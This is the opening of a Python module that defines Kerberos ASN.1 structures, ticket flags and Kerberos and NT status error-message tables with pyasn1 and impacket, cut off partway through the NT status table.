#!/usr/bin/python3

##########################################################
#                     Dependencies                       #
##########################################################

# ADDITIONAL PROTOCOLS = NDR, types and structures
from impacket.dcerpc.v5 import samr, dtypes, ndr
from impacket.structure import Structure

# Others
import binascii, re, base64, enum, math, hmac, socket, sys, random, hashlib, ctypes, traceback, string, time, datetime
from calendar import timegm
from time import strptime
from os import urandom
from io import StringIO
from enum import Enum
from functools import reduce
from struct import pack, unpack, calcsize
from asn1crypto import core, keys, algos, cms
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.primitives import serialization
from oscrypto.asymmetric import rsa_pkcs1v15_sign, load_private_key
from oscrypto.keys import parse_certificate, parse_private
from Crypto.Cipher import ARC4, AES
from Crypto.Hash import HMAC, MD5, SHA1, SHA, CMAC
from Cryptodome.Protocol.KDF import PBKDF2
from Cryptodome.Util.number import GCD as gcd
from pyasn1.codec.der import encoder, decoder
from pyasn1.type import tag, namedtype, univ, useful, constraint, char
from pyasn1.type.univ import noValue, Sequence
from pyasn1.type.useful import GeneralizedTime
try: # In case OpenSSL have MD4 disabled
	ctypes.CDLL("libssl.so").OSSL_PROVIDER_load(None, b"legacy")
	ctypes.CDLL("libssl.so").OSSL_PROVIDER_load(None, b"default")
except:
	pass

##############################################################
#                     General Structures                     #
##############################################################

def _sequence_component(name, tag_value, type, **subkwargs):
	return namedtype.NamedType (name, type.subtype (explicitTag = tag.Tag (tag.tagClassContext, tag.tagFormatSimple, tag_value), **subkwargs))

def _sequence_optional_component(name, tag_value, type, **subkwargs):
	return namedtype.OptionalNamedType (name, type.subtype (explicitTag = tag.Tag (tag.tagClassContext, tag.tagFormatSimple, tag_value), **subkwargs))

def _sequence_component_implicit(name, tag_value, type, **subkwargs):
	return namedtype.NamedType (name, type.subtype (implicitTag = tag.Tag (tag.tagClassContext, tag.tagFormatSimple, tag_value), **subkwargs))

def _sequence_optional_component_implicit(name, tag_value, type, **subkwargs):
	return namedtype.OptionalNamedType (name, type.subtype (implicitTag = tag.Tag (tag.tagClassContext, tag.tagFormatSimple, tag_value), **subkwargs))

def _application_tag (tag_value):
	return univ.Sequence.tagSet.tagExplicitly (tag.Tag (tag.tagClassApplication, tag.tagFormatConstructed, int (tag_value)))

def _vno_component (tag_value, name = "pvno"):
	return _sequence_component (name, tag_value, univ.Integer(), subtypeSpec = constraint.ValueRangeConstraint (5, 5))

def _msg_type_component(tag_value, values):
	c = constraint.ConstraintsUnion(*(constraint.SingleValueConstraint(int(v)) for v in values))
	return _sequence_component('msg-type', tag_value, univ.Integer(), subtypeSpec = c)

def seq_set(seq, name, builder = None, *args, **kwargs):
	component = seq.setComponentByName(name).getComponentByName(name)
	if builder is not None:
		seq.setComponentByName(name, builder(component, *args, **kwargs))
	else:
		seq.setComponentByName(name)
	return seq.getComponentByName(name)

def seq_set_iter(seq, name, iterable):
	component = seq.setComponentByName(name).getComponentByName(name)
	for pos, v in enumerate(iterable):
		component.setComponentByPosition(pos, v)

class Int32 (univ.Integer):
	subtypeSpec = univ.Integer.subtypeSpec + constraint.ValueRangeConstraint (-2147483648, 2147483647)

class UInt32(univ.Integer):
	pass
#   subtypeSpec = univ.Integer.subtypeSpec + constraint.ValueRangeConstraint(0, 4294967295)

class Microseconds (univ.Integer):
	subtypeSpec = univ.Integer.subtypeSpec + constraint.ValueRangeConstraint (0, 999999)

def _asn1_decode(data, asn1Spec):
	if isinstance(data, str) or isinstance(data,bytes):
		data, substrate = decoder.decode(data, asn1Spec=asn1Spec)
		if substrate != b'':
			raise Exception("asn1 encoding invalid")
	return data

#######################################################################
#                     General Kerberos Structures                     #
#######################################################################

class ApplicationTagNumbers(Enum):
	Ticket         = 1
	Authenticator  = 2
	EncTicketPart  = 3
	AS_REQ         = 10
	AS_REP         = 11
	TGS_REQ        = 12
	TGS_REP        = 13
	AP_REQ         = 14
	AP_REP         = 15
	RESERVED16     = 16
	RESERVED17     = 17
	KRB_SAFE       = 20
	KRB_PRIV       = 21
	KRB_CRED       = 22
	EncASRepPart   = 25
	EncTGSRepPart  = 26
	EncApRepPart   = 27
	EncKrbPrivPart = 28 
	EncKrbCredPart = 29
	KRB_ERROR      = 30

class PreAuthenticationDataTypes(Enum):
	PA_TGS_REQ                 = 1
	PA_ENC_TIMESTAMP           = 2
	PA_PW_SALT                 = 3
	PA_ENC_UNIX_TIME           = 5
	PA_SANDIA_SECUREID         = 6
	PA_SESAME                  = 7
	PA_OSF_DCE                 = 8
	PA_CYBERSAFE_SECUREID      = 9
	PA_AFS3_SALT               = 10
	PA_ETYPE_INFO              = 11
	PA_SAM_CHALLENGE           = 12
	PA_SAM_RESPONSE            = 13
	PA_PK_AS_REQ_OLD           = 14
	PA_PK_AS_REP_OLD           = 15
	PA_PK_AS_REQ               = 16
	PA_PK_AS_REP               = 17
	PA_ETYPE_INFO2             = 19
	PA_USE_SPECIFIED_KVNO      = 20
	PA_SAM_REDIRECT            = 21
	PA_GET_FROM_TYPED_DATA     = 22
	TD_PADATA                  = 22
	PA_SAM_ETYPE_INFO          = 23
	PA_ALT_PRINC               = 24
	PA_SAM_CHALLENGE2          = 30
	PA_SAM_RESPONSE2           = 31
	PA_EXTRA_TGT               = 41
	TD_PKINIT_CMS_CERTIFICATES = 101
	TD_KRB_PRINCIPAL           = 102
	TD_KRB_REALM               = 103
	TD_TRUSTED_CERTIFIERS      = 104
	TD_CERTIFICATE_INDEX       = 105
	TD_APP_DEFINED_ERROR       = 106
	TD_REQ_NONCE               = 107
	TD_REQ_SEQ                 = 108
	PA_PAC_REQUEST             = 128
	PA_FOR_USER                = 129
	PA_FX_COOKIE               = 133 
	PA_FX_FAST                 = 136
	PA_FX_ERROR                = 137
	PA_ENCRYPTED_CHALLENGE     = 138
	KERB_KEY_LIST_REQ          = 161
	KERB_KEY_LIST_REP          = 162
	PA_SUPPORTED_ENCTYPES      = 165
	PA_PAC_OPTIONS             = 167

class PA_DATA (univ.Sequence):
	componentType = namedtype.NamedTypes (_sequence_component ('padata-type', 1, Int32()), _sequence_component ('padata-value', 2, univ.OctetString()))

class KerberosString (char.GeneralString):
	pass

class Realm (KerberosString):
	pass

class PrincipalName (univ.Sequence):
	componentType = namedtype.NamedTypes (_sequence_component ("name-type", 0, Int32()), _sequence_component ("name-string", 1, univ.SequenceOf (componentType = KerberosString())))

class KerberosTime (useful.GeneralizedTime):
	pass

class KerberosTimeCore(core.GeneralizedTime):
    """KerberosTime ::= GeneralizedTime
    """

class KerberosTimeObj(object):
	INDEFINITE = datetime.datetime(1970, 1, 1, 0, 0, 0)

	@staticmethod
	def to_asn1(dt):
		# A KerberosTime is really just a string, so we can return a
		# string here, and the asn1 library will convert it correctly.
		return "%04d%02d%02d%02d%02d%02dZ" % (dt.year, dt.month, dt.day, dt.hour, dt.minute, dt.second)

	@staticmethod
	def from_asn1(data):
		data = str(data)
		year = int(data[0:4])
		month = int(data[4:6])
		day = int(data[6:8])
		hour = int(data[8:10])
		minute = int(data[10:12])
		second = int(data[12:14])
		if data[14] != 'Z':
			raise Exception("[-] Timezone in KerberosTime is not Z")
		return datetime.datetime(year, month, day, hour, minute, second)

class HostAddress (univ.Sequence):
	componentType = namedtype.NamedTypes (_sequence_component ("addr-type", 0, Int32()), _sequence_component ("address", 1, univ.OctetString()))

class HostAddresses (univ.SequenceOf):
	componentType = HostAddress()

class EncryptionKey (univ.Sequence):
	componentType = namedtype.NamedTypes (_sequence_component ('keytype', 0, Int32()), _sequence_component ('keyvalue', 1, univ.OctetString()))

class TransitedEncoding (univ.Sequence):
	componentType = namedtype.NamedTypes (_sequence_component ('tr-type', 0, Int32()), _sequence_component ('contents', 1, univ.OctetString()))

class AuthorizationData (univ.SequenceOf):
	componentType = univ.Sequence (componentType = namedtype.NamedTypes (_sequence_component ('ad-type', 0, Int32()), _sequence_component ('ad-data', 1, univ.OctetString())))

class AD_IF_RELEVANT (AuthorizationData):
	pass

class KerberosFlags (univ.BitString):
	pass

class TicketFlags (KerberosFlags):
	pass

class LastReq (univ.SequenceOf):
	componentType = univ.Sequence (componentType = namedtype.NamedTypes (_sequence_component ('lr-type', 0, Int32()), _sequence_component ('lr-value', 1, KerberosTime())))

class METHOD_DATA (univ.SequenceOf):
	componentType = PA_DATA()

class TicketFlagsDecoder (enum.IntFlag):
	Reserved = 1 * 2**31
	Forwardable = 1 * 2**30
	Forwarded = 1 * 2**29
	Proxiable = 1 * 2**28
	Proxy = 1 * 2**27
	May_Postdate = 1 * 2**26
	Postdated = 1 * 2**25
	Invalid = 1 * 2**24
	Renewable = 1 * 2**23
	Initial = 1 * 2**22
	Pre_Authent = 1 * 2**21
	HW_Authent = 1 * 2**20
	Transited_Policy_Checked = 1 * 2**19
	OK_As_Delegate = 1 * 2**18
	Enc_PA_Rep = 1 * 2**17
	Anonymous = 1 * 2**16

class Checksum (univ.Sequence):
	componentType = namedtype.NamedTypes (_sequence_component ('cksumtype', 0, Int32()), _sequence_component ('checksum', 1, univ.OctetString()))

class Authenticator (univ.Sequence):
	tagSet = _application_tag (2)
	componentType = namedtype.NamedTypes (
		_vno_component (name = 'authenticator-vno', tag_value = 0),
		_sequence_component ('crealm', 1, Realm()),
		_sequence_component ('cname', 2, PrincipalName()),
		_sequence_optional_component ('cksum', 3, Checksum()),
		_sequence_component ('cusec', 4, Microseconds()),
		_sequence_component ('ctime', 5, KerberosTime()),
		_sequence_optional_component ('subkey', 6, EncryptionKey()),
		_sequence_optional_component ('seq-number', 7, UInt32()),
		_sequence_optional_component ('authorization-data', 8, AuthorizationData())
		)

class ErrorCodes(Enum):
	KDC_ERR_NONE                                 = 0  # No error
	KDC_ERR_NAME_EXP                             = 1  # Client's entry in database
													  # has expired
	KDC_ERR_SERVICE_EXP                          = 2  # Server's entry in database
													  # has expired
	KDC_ERR_BAD_PVNO                             = 3  # Requested protocol version
													  # number not supported
	KDC_ERR_C_OLD_MAST_KVNO                      = 4  # Client's key encrypted in
													  # old master key
	KDC_ERR_S_OLD_MAST_KVNO                      = 5  # Server's key encrypted in
													  # old master key
	KDC_ERR_C_PRINCIPAL_UNKNOWN                  = 6  # Client not found in
													  # Kerberos database
	KDC_ERR_S_PRINCIPAL_UNKNOWN                  = 7  # Server not found in
													  # Kerberos database
	KDC_ERR_PRINCIPAL_NOT_UNIQUE                 = 8  # Multiple principal entries
													  # in database
	KDC_ERR_NULL_KEY                             = 9  # The client or server has a
													  # null key
	KDC_ERR_CANNOT_POSTDATE                     = 10  # Ticket not eligible for
													  # postdating
	KDC_ERR_NEVER_VALID                         = 11  # Requested starttime is
													  # later than end time
	KDC_ERR_POLICY                              = 12  # KDC policy rejects request
	KDC_ERR_BADOPTION                           = 13  # KDC cannot accommodate
													  # requested option
	KDC_ERR_ETYPE_NOSUPP                        = 14  # KDC has no support for
													  # encryption type
	KDC_ERR_SUMTYPE_NOSUPP                      = 15  # KDC has no support for
													  # checksum type
	KDC_ERR_PADATA_TYPE_NOSUPP                  = 16  # KDC has no support for
													  # padata type
	KDC_ERR_TRTYPE_NOSUPP                       = 17  # KDC has no support for
													  # transited type
	KDC_ERR_CLIENT_REVOKED                      = 18  # Clients credentials have
													  # been revoked
	KDC_ERR_SERVICE_REVOKED                     = 19  # Credentials for server have
													  # been revoked
	KDC_ERR_TGT_REVOKED                         = 20  # TGT has been revoked
	KDC_ERR_CLIENT_NOTYET                       = 21  # Client not yet valid; try
													  # again later
	KDC_ERR_SERVICE_NOTYET                      = 22  # Server not yet valid; try
													  # again later
	KDC_ERR_KEY_EXPIRED                         = 23  # Password has expired;
													  # change password to reset
	KDC_ERR_PREAUTH_FAILED                      = 24  # Pre-authentication
													  # information was invalid
	KDC_ERR_PREAUTH_REQUIRED                    = 25  # Additional pre-
													  # authentication required
	KDC_ERR_SERVER_NOMATCH                      = 26  # Requested server and ticket
													  # don't match
	KDC_ERR_MUST_USE_USER2USER                  = 27  # Server principal valid for
													  # user2user only
	KDC_ERR_PATH_NOT_ACCEPTED                   = 28  # KDC Policy rejects
													  # transited path
	KDC_ERR_SVC_UNAVAILABLE                     = 29  # A service is not available
	KRB_AP_ERR_BAD_INTEGRITY                    = 31  # Integrity check on
													  # decrypted field failed
	KRB_AP_ERR_TKT_EXPIRED                      = 32  # Ticket expired
	KRB_AP_ERR_TKT_NYV                          = 33  # Ticket not yet valid
	KRB_AP_ERR_REPEAT                           = 34  # Request is a replay
	KRB_AP_ERR_NOT_US                           = 35  # The ticket isn't for us
	KRB_AP_ERR_BADMATCH                         = 36  # Ticket and authenticator
													  # don't match
	KRB_AP_ERR_SKEW                             = 37  # Clock skew too great
	KRB_AP_ERR_BADADDR                          = 38  # Incorrect net address
	KRB_AP_ERR_BADVERSION                       = 39  # Protocol version mismatch
	KRB_AP_ERR_MSG_TYPE                         = 40  # Invalid msg type
	KRB_AP_ERR_MODIFIED                         = 41  # Message stream modified
	KRB_AP_ERR_BADORDER                         = 42  # Message out of order
	KRB_AP_ERR_BADKEYVER                        = 44  # Specified version of key is
													  # not available
	KRB_AP_ERR_NOKEY                            = 45  # Service key not available
	KRB_AP_ERR_MUT_FAIL                         = 46  # Mutual authentication
													  # failed
	KRB_AP_ERR_BADDIRECTION                     = 47  # Incorrect message direction
	KRB_AP_ERR_METHOD                           = 48  # Alternative authentication
													  # method required
	KRB_AP_ERR_BADSEQ                           = 49  # Incorrect sequence number
													  # in message
	KRB_AP_ERR_INAPP_CKSUM                      = 50  # Inappropriate type of
													  # checksum in message
	KRB_AP_PATH_NOT_ACCEPTED                    = 51  # Policy rejects transited
													  # path
	KRB_ERR_RESPONSE_TOO_BIG                    = 52  # Response too big for UDP;
													  # retry with TCP
	KRB_ERR_GENERIC                             = 60  # Generic error (description
													  # in e-text)
	KRB_ERR_FIELD_TOOLONG                       = 61  # Field is too long for this
													  # implementation
	KDC_ERROR_CLIENT_NOT_TRUSTED                = 62  # Reserved for PKINIT
	KDC_ERROR_KDC_NOT_TRUSTED                   = 63  # Reserved for PKINIT
	KDC_ERROR_INVALID_SIG                       = 64  # Reserved for PKINIT
	KDC_ERR_KEY_TOO_WEAK                        = 65  # Reserved for PKINIT
	KDC_ERR_CERTIFICATE_MISMATCH                = 66  # Reserved for PKINIT
	KRB_AP_ERR_NO_TGT                           = 67  # No TGT available to
													  # validate USER-TO-USER
	KDC_ERR_WRONG_REALM                         = 68  # Reserved for future use
	KRB_AP_ERR_USER_TO_USER_REQUIRED            = 69  # Ticket must be for
													  # USER-TO-USER
	KDC_ERR_CANT_VERIFY_CERTIFICATE             = 70  # Reserved for PKINIT
	KDC_ERR_INVALID_CERTIFICATE                 = 71  # Reserved for PKINIT
	KDC_ERR_REVOKED_CERTIFICATE                 = 72  # Reserved for PKINIT
	KDC_ERR_REVOCATION_STATUS_UNKNOWN           = 73  # Reserved for PKINIT
	KDC_ERR_REVOCATION_STATUS_UNAVAILABLE       = 74  # Reserved for PKINIT
	KDC_ERR_CLIENT_NAME_MISMATCH                = 75  # Reserved for PKINIT
	KDC_ERR_KDC_NAME_MISMATCH                   = 76  # Reserved for PKINIT
	KDC_ERR_INCONSISTENT_KEY_PURPOSE            = 77  # Reserved for PKINIT
	KDC_ERR_DIGEST_IN_CERT_NOT_ACCEPTED         = 78  # Reserved for PKINIT
	KDC_ERR_PA_CHECKSUM_MUST_BE_INCLUDED        = 79  # Reserved for PKINIT
	KDC_ERR_DIGEST_IN_SIGNED_DATA_NOT_ACCEPTED  = 80  # Reserved for PKINIT
	KDC_ERR_PUBLIC_KEY_ENCRYPTION_NOT_SUPPORTED = 81  # Reserved for PKINIT
	KDC_ERR_PREAUTH_EXPIRED                     = 90  # Pre-authentication has expired
	KDC_ERR_MORE_PREAUTH_DATA_REQUIRED          = 91  # Additional pre-authentication data is required
	KDC_ERR_PREAUTH_BAD_AUTHENTICATION_SET      = 92  # KDC cannot accommodate requested pre-authentication data element
	KDC_ERR_UNKNOWN_CRITICAL_FAST_OPTIONS       = 93  # Reserved for PKINIT

KRB_ERROR_MESSAGES = {
	0  : ('KDC_ERR_NONE', 'No error'),
	1  : ('KDC_ERR_NAME_EXP', 'Client\'s entry in database has expired'),
	2  : ('KDC_ERR_SERVICE_EXP', 'Server\'s entry in database has expired'),
	3  : ('KDC_ERR_BAD_PVNO', 'Requested protocol version number not supported'),
	4  : ('KDC_ERR_C_OLD_MAST_KVNO', 'Client\'s key encrypted in old master key'),
	5  : ('KDC_ERR_S_OLD_MAST_KVNO', 'Server\'s key encrypted in old master key'),
	6  : ('KDC_ERR_C_PRINCIPAL_UNKNOWN', 'Client not found in Kerberos database'),
	7  : ('KDC_ERR_S_PRINCIPAL_UNKNOWN', 'Server not found in Kerberos database'),
	8  : ('KDC_ERR_PRINCIPAL_NOT_UNIQUE', 'Multiple principal entries in database'),
	9  : ('KDC_ERR_NULL_KEY', 'The client or server has a null key'),
	10 : ('KDC_ERR_CANNOT_POSTDATE', 'Ticket not eligible for postdating'),
	11 : ('KDC_ERR_NEVER_VALID', 'Requested starttime is later than end time'),
	12 : ('KDC_ERR_POLICY', 'KDC policy rejects request'),
	13 : ('KDC_ERR_BADOPTION', 'KDC cannot accommodate requested option'),
	14 : ('KDC_ERR_ETYPE_NOSUPP', 'KDC has no support for encryption type'),
	15 : ('KDC_ERR_SUMTYPE_NOSUPP', 'KDC has no support for checksum type'),
	16 : ('KDC_ERR_PADATA_TYPE_NOSUPP', 'KDC has no support for padata type'),
	17 : ('KDC_ERR_TRTYPE_NOSUPP', 'KDC has no support for transited type'),
	18 : ('KDC_ERR_CLIENT_REVOKED', 'Clients credentials have been revoked'),
	19 : ('KDC_ERR_SERVICE_REVOKED', 'Credentials for server have been revoked'),
	20 : ('KDC_ERR_TGT_REVOKED', 'TGT has been revoked'),
	21 : ('KDC_ERR_CLIENT_NOTYET', 'Client not yet valid; try again later'),
	22 : ('KDC_ERR_SERVICE_NOTYET', 'Server not yet valid; try again later'),
	23 : ('KDC_ERR_KEY_EXPIRED', 'Password has expired; change password to reset'),
	24 : ('KDC_ERR_PREAUTH_FAILED', 'Pre-authentication information was invalid'),
	25 : ('KDC_ERR_PREAUTH_REQUIRED', 'Additional pre-authentication required'),
	26 : ('KDC_ERR_SERVER_NOMATCH', 'Requested server and ticket don\'t match'),
	27 : ('KDC_ERR_MUST_USE_USER2USER', 'Server principal valid for user2user only'),
	28 : ('KDC_ERR_PATH_NOT_ACCEPTED', 'KDC Policy rejects transited path'),
	29 : ('KDC_ERR_SVC_UNAVAILABLE', 'A service is not available'),
	31 : ('KRB_AP_ERR_BAD_INTEGRITY', 'Integrity check on decrypted field failed'),
	32 : ('KRB_AP_ERR_TKT_EXPIRED', 'Ticket expired'),
	33 : ('KRB_AP_ERR_TKT_NYV', 'Ticket not yet valid'),
	34 : ('KRB_AP_ERR_REPEAT', 'Request is a replay'),
	35 : ('KRB_AP_ERR_NOT_US', 'The ticket isn\'t for us'),
	36 : ('KRB_AP_ERR_BADMATCH', 'Ticket and authenticator don\'t match'),
	37 : ('KRB_AP_ERR_SKEW', 'Clock skew too great'),
	38 : ('KRB_AP_ERR_BADADDR', 'Incorrect net address'),
	39 : ('KRB_AP_ERR_BADVERSION', 'Protocol version mismatch'),
	40 : ('KRB_AP_ERR_MSG_TYPE', 'Invalid msg type'),
	41 : ('KRB_AP_ERR_MODIFIED', 'Message stream modified'),
	42 : ('KRB_AP_ERR_BADORDER', 'Message out of order'),
	44 : ('KRB_AP_ERR_BADKEYVER', 'Specified version of key is not available'),
	45 : ('KRB_AP_ERR_NOKEY', 'Service key not available'),
	46 : ('KRB_AP_ERR_MUT_FAIL', 'Mutual authentication failed'),
	47 : ('KRB_AP_ERR_BADDIRECTION', 'Incorrect message direction'),
	48 : ('KRB_AP_ERR_METHOD', 'Alternative authentication method required'),
	49 : ('KRB_AP_ERR_BADSEQ', 'Incorrect sequence number in message'),
	50 : ('KRB_AP_ERR_INAPP_CKSUM', 'Inappropriate type of checksum in message'),
	51 : ('KRB_AP_PATH_NOT_ACCEPTED', 'Policy rejects transited path'),
	52 : ('KRB_ERR_RESPONSE_TOO_BIG', 'Response too big for UDP; retry with TCP'),
	60 : ('KRB_ERR_GENERIC', 'Generic error (description in e-text)'),
	61 : ('KRB_ERR_FIELD_TOOLONG', 'Field is too long for this implementation'),
	62 : ('KDC_ERROR_CLIENT_NOT_TRUSTED', 'Reserved for PKINIT'),
	63 : ('KDC_ERROR_KDC_NOT_TRUSTED', 'Reserved for PKINIT'),
	64 : ('KDC_ERROR_INVALID_SIG', 'Reserved for PKINIT'),
	65 : ('KDC_ERR_KEY_TOO_WEAK', 'Reserved for PKINIT'),
	66 : ('KDC_ERR_CERTIFICATE_MISMATCH', 'Reserved for PKINIT'),
	67 : ('KRB_AP_ERR_NO_TGT', 'No TGT available to validate USER-TO-USER'),
	68 : ('KDC_ERR_WRONG_REALM', 'Reserved for future use'),
	69 : ('KRB_AP_ERR_USER_TO_USER_REQUIRED', 'Ticket must be for USER-TO-USER'),
	70 : ('KDC_ERR_CANT_VERIFY_CERTIFICATE', 'Reserved for PKINIT'),
	71 : ('KDC_ERR_INVALID_CERTIFICATE', 'Reserved for PKINIT'),
	72 : ('KDC_ERR_REVOKED_CERTIFICATE', 'Reserved for PKINIT'),
	73 : ('KDC_ERR_REVOCATION_STATUS_UNKNOWN', 'Reserved for PKINIT'),
	74 : ('KDC_ERR_REVOCATION_STATUS_UNAVAILABLE', 'Reserved for PKINIT'),
	75 : ('KDC_ERR_CLIENT_NAME_MISMATCH', 'Reserved for PKINIT'),
	76 : ('KDC_ERR_KDC_NAME_MISMATCH', 'Reserved for PKINIT'),
	77 : ('KDC_ERR_INCONSISTENT_KEY_PURPOSE', 'Certificate cannot be used for PKINIT client authentication'),
	78 : ('KDC_ERR_DIGEST_IN_CERT_NOT_ACCEPTED', 'Digest algorithm for the public key in the certificate is not acceptable by the KDC'),
	79 : ('KDC_ERR_PA_CHECKSUM_MUST_BE_INCLUDED', 'The paChecksum filed in the request is not present'),
	80 : ('KDC_ERR_DIGEST_IN_SIGNED_DATA_NOT_ACCEPTED', 'The digest algorithm used by the id-pkinit-authData is not acceptable by the KDC'),
	81 : ('KDC_ERR_PUBLIC_KEY_ENCRYPTION_NOT_SUPPORTED', 'The KDC does not support the public key encryption key delivery method'),
	90 : ('KDC_ERR_PREAUTH_EXPIRED', 'Pre-authentication has expired'),
	91 : ('KDC_ERR_MORE_PREAUTH_DATA_REQUIRED', 'Additional pre-authentication data is required'),
	92 : ('KDC_ERR_PREAUTH_BAD_AUTHENTICATION_SET', 'KDC cannot accommodate requested pre-authentication data element'),
	93 : ('KDC_ERR_UNKNOWN_CRITICAL_FAST_OPTIONS', 'Unknown critical option'),
}

class KRB_ERROR(univ.Sequence):
	tagSet = _application_tag(ApplicationTagNumbers.KRB_ERROR.value)
	componentType = namedtype.NamedTypes (
		_vno_component(0),
		_msg_type_component(1, (ApplicationTagNumbers.KRB_ERROR.value,)),
		_sequence_optional_component('ctime', 2, KerberosTime()),
		_sequence_optional_component('cusec', 3, Microseconds()),
		_sequence_component('stime', 4, KerberosTime()),
		_sequence_component('susec', 5, Microseconds()),
		_sequence_component('error-code', 6, Int32()),
		_sequence_optional_component('crealm', 7, Realm()),
		_sequence_optional_component('cname', 8, PrincipalName()),
		_sequence_component('realm', 9, Realm()),
		_sequence_component('sname', 10, PrincipalName()),
		_sequence_optional_component('e-text', 11, KerberosString()),
		_sequence_optional_component('e-data', 12, univ.OctetString())
		)

NT_ERROR_MESSAGES = {
		0x00000000: ("STATUS_SUCCESS","The operation completed successfully."),
		0x00000001: ("STATUS_WAIT_1","The caller specified WaitAny for WaitType and one of the dispatcher objects in the Object array has been set to the signaled state."),
		0x00000002: ("STATUS_WAIT_2","The caller specified WaitAny for WaitType and one of the dispatcher objects in the Object array has been set to the signaled state."),
		0x00000003: ("STATUS_WAIT_3","The caller specified WaitAny for WaitType and one of the dispatcher objects in the Object array has been set to the signaled state."),
		0x0000003F: ("STATUS_WAIT_63","The caller specified WaitAny for WaitType and one of the dispatcher objects in the Object array has been set to the signaled state."),
		0x00000080: ("STATUS_ABANDONED","The caller attempted to wait for a mutex that has been abandoned."),
		0x00000080: ("STATUS_ABANDONED_WAIT_0","The caller attempted to wait for a mutex that has been abandoned."),
		0x000000BF: ("STATUS_ABANDONED_WAIT_63","The caller attempted to wait for a mutex that has been abandoned."),
		0x000000C0: ("STATUS_USER_APC","A user-mode APC was delivered before the given Interval expired."),
		0x00000101: ("STATUS_ALERTED","The delay completed because the thread was alerted."),
		0x00000102: ("STATUS_TIMEOUT","The given Timeout interval expired."),
		0x00000103: ("STATUS_PENDING","The operation that was requested is pending completion."),
		0x00000104: ("STATUS_REPARSE","A reparse should be performed by the Object Manager because the name of the file resulted in a symbolic link."),
		0x00000105: ("STATUS_MORE_ENTRIES","Returned by enumeration APIs to indicate more information is available to successive calls."),
		0x00000106: ("STATUS_NOT_ALL_ASSIGNED","Indicates not all privileges or groups that are referenced are assigned to the caller. This allows, for example, all privileges to be disabled without having to know exactly which privileges are assigned."),
		0x00000107: ("STATUS_SOME_NOT_MAPPED","Some of the information to be translated has not been translated."),
		0x00000108: ("STATUS_OPLOCK_BREAK_IN_PROGRESS","An open/create operation completed while an opportunistic lock (oplock) break is underway."),
		0x00000109: ("STATUS_VOLUME_MOUNTED","A new volume has been mounted by a file system."),
		0x0000010A: ("STATUS_RXACT_COMMITTED","This success level status indicates that the transaction state already exists for the registry subtree but that a transaction commit was previously aborted. The commit has now been completed."),
		0x0000010B: ("STATUS_NOTIFY_CLEANUP","Indicates that a notify change request has been completed due to closing the handle that made the notify change request."),
		0x0000010C: ("STATUS_NOTIFY_ENUM_DIR","Indicates that a notify change request is being completed and that the information is not being returned in the caller's buffer. The caller now needs to enumerate the files to find the changes."),
		0x0000010D: ("STATUS_NO_QUOTAS_FOR_ACCOUNT","{No Quotas} No system quota limits are specifically set for this account."),
		0x0000010E: ("STATUS_PRIMARY_TRANSPORT_CONNECT_FAILED","{Connect Failure on Primary Transport} An attempt was made to connect to the remote server %hs on the primary transport, but the connection failed. The computer WAS able to connect on a secondary transport."),
		0x00000110: ("STATUS_PAGE_FAULT_TRANSITION","The page fault was a transition fault."),
		0x00000111: ("STATUS_PAGE_FAULT_DEMAND_ZERO","The page fault was a demand zero fault."),
		0x00000112: ("STATUS_PAGE_FAULT_COPY_ON_WRITE","The page fault was a demand zero fault."),
		0x00000113: ("STATUS_PAGE_FAULT_GUARD_PAGE","The page fault was a demand zero fault."),
		0x00000114: ("STATUS_PAGE_FAULT_PAGING_FILE","The page fault was satisfied by reading from a secondary storage device."),
		0x00000115: ("STATUS_CACHE_PAGE_LOCKED","The cached page was locked during operation."),
		0x00000116: ("STATUS_CRASH_DUMP","The crash dump exists in a paging file."),
		0x00000117: ("STATUS_BUFFER_ALL_ZEROS","The specified buffer contains all zeros."),
		0x00000118: ("STATUS_REPARSE_OBJECT","A reparse should be performed by the Object Manager because the name of the file resulted in a symbolic link."),
		0x00000119: ("STATUS_RESOURCE_REQUIREMENTS_CHANGED","The device has succeeded a query-stop and its resource requirements have changed."),
		0x00000120: ("STATUS_TRANSLATION_COMPLETE","The translator has translated these resources into the global space and no additional translations should be performed."),
		0x00000121: ("STATUS_DS_MEMBERSHIP_EVALUATED_LOCALLY","The directory service evaluated group memberships locally, because it was unable to contact a global catalog server."),
		0x00000122: ("STATUS_NOTHING_TO_TERMINATE","A process being terminated has no threads to terminate."),
		0x00000123: ("STATUS_PROCESS_NOT_IN_JOB","The specified process is not part of a job."),
		0x00000124: ("STATUS_PROCESS_IN_JOB","The specified process is part of a job."),
		0x00000125: ("STATUS_VOLSNAP_HIBERNATE_READY","{Volume Shadow Copy Service} The system is now ready for hibernation."),
		0x00000126: ("STATUS_FSFILTER_OP_COMPLETED_SUCCESSFULLY","A file system or file system filter driver has successfully completed an FsFilter operation."),
		0x00000127: ("STATUS_INTERRUPT_VECTOR_ALREADY_CONNECTED","The specified interrupt vector was already connected."),
		0x00000128: ("STATUS_INTERRUPT_STILL_CONNECTED","The specified interrupt vector is still connected."),
		0x00000129: ("STATUS_PROCESS_CLONED","The current process is a cloned process."),
		0x0000012A: ("STATUS_FILE_LOCKED_WITH_ONLY_READERS","The file was locked and all users of the file can only read."),
		0x0000012B: ("STATUS_FILE_LOCKED_WITH_WRITERS","The file was locked and at least one user of the file can write."),
		0x00000202: ("STATUS_RESOURCEMANAGER_READ_ONLY","The specified ResourceManager made no changes or updates to the resource under this transaction."),
		0x00000367: ("STATUS_WAIT_FOR_OPLOCK","An operation is blocked and waiting for an oplock."),
		0x00010001: ("DBG_EXCEPTION_HANDLED","Debugger handled the exception."),
		0x00010002: ("DBG_CONTINUE","The debugger continued."),
		0x001C0001: ("STATUS_FLT_IO_COMPLETE","The IO was completed by a filter."),
		0xC0000467: ("STATUS_FILE_NOT_AVAILABLE","The file is temporarily unavailable."),
		0xC0000721: ("STATUS_CALLBACK_RETURNED_THREAD_AFFINITY","A threadpool worker thread entered a callback at thread affinity %p and exited at affinity %p.  This is unexpected, indicating that the callback missed restoring the priority."),
		0x40000000: ("STATUS_OBJECT_NAME_EXISTS","{Object Exists} An attempt was made to create an object but the object name already exists."),
		0x40000001: ("STATUS_THREAD_WAS_SUSPENDED","{Thread Suspended} A thread termination occurred while the thread was suspended. The thread resumed, and termination proceeded."),
		0x40000002: ("STATUS_WORKING_SET_LIMIT_RANGE","{Working Set Range Error} An attempt was made to set the working set minimum or maximum to values that are outside the allowable range."),
		0x40000003: ("STATUS_IMAGE_NOT_AT_BASE","{Image Relocated} An image file could not be mapped at the address that is specified in the image file. Local fixes must be performed on this image."),
